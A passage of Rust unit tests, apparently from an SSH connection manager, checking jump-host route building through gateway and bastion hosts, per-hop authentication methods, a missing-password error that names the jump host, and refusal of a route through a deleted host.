        let mut gateway = Host::new("gateway".into(), "gw.test".into(), "ops".into());
        gateway.auth = AuthMethod::Agent;
        store.repos().hosts().save(&mut gateway).expect("save");
        let mut bastion = Host::new("bastion".into(), "bastion.test".into(), "ops".into());
        bastion.auth = AuthMethod::Agent;
        bastion.jump_chain = vec![gateway.id];
        store.repos().hosts().save(&mut bastion).expect("save");
        let mut target = Host::new("app".into(), "app.test".into(), "deploy".into());
        target.auth = AuthMethod::Agent;
        target.jump_chain = vec![bastion.id];
        store.repos().hosts().save(&mut target).expect("save");

        let prepared = prepare(
            &store,
            target.id,
            &SessionSecrets::default(),
            &HashMap::new(),
        )
        .expect("route");
        let route: Vec<&str> = prepared
            .hops
            .iter()
            .map(|(hop, _)| hop.name.as_str())
            .collect();
        assert_eq!(
            route,
            ["gateway", "bastion"],
            "the first hop's own route comes first"
        );
        assert_eq!(prepared.host.name, "app");
        assert_eq!(
            names(&prepared.hops[0].1),
            ["publickey (agent)", "keyboard-interactive"]
        );
    }

    #[test]
    fn a_hop_that_needs_a_password_says_which_host() {
        let (_dir, store) = temp_store();
        let mut bastion = Host::new("bastion".into(), "bastion.test".into(), "ops".into());
        bastion.auth = AuthMethod::Password;
        store.repos().hosts().save(&mut bastion).expect("save");
        let mut target = Host::new("app".into(), "app.test".into(), "deploy".into());
        target.auth = AuthMethod::Agent;
        target.jump_chain = vec![bastion.id];
        store.repos().hosts().save(&mut target).expect("save");

        let error = prepare(
            &store,
            target.id,
            &SessionSecrets::default(),
            &HashMap::new(),
        )
        .err()
        .expect("the hop has no password");
        assert!(error.message.contains("jump host"), "{}", error.message);
        assert!(error.message.contains("bastion"), "{}", error.message);

        // What the user typed for the hop is used.
        let typed = HashMap::from([(bastion.id.to_string(), secrets(Some("typed")))]);
        let prepared =
            prepare(&store, target.id, &SessionSecrets::default(), &typed).expect("route");
        assert_eq!(
            names(&prepared.hops[0].1),
            ["password", "keyboard-interactive"]
        );
    }

    #[test]
    fn a_route_through_a_deleted_host_is_refused_with_a_clear_message() {
        let (_dir, store) = temp_store();
        let mut bastion = Host::new("bastion".into(), "bastion.test".into(), "ops".into());
        bastion.auth = AuthMethod::Agent;
        store.repos().hosts().save(&mut bastion).expect("save");
        let mut target = Host::new("app".into(), "app.test".into(), "deploy".into());
        target.auth = AuthMethod::Agent;
        target.jump_chain = vec![bastion.id];
        store.repos().hosts().save(&mut target).expect("save");
        store
            .repos()
            .hosts()
            .soft_delete(bastion.id)
            .expect("delete");
        let error = prepare(
            &store,
            target.id,
            &SessionSecrets::default(),
            &HashMap::new(),
        )
        .err()
        .expect("refused");
        assert!(
            error.message.contains("does not exist"),
            "{}",
            error.message
        );
    }
}
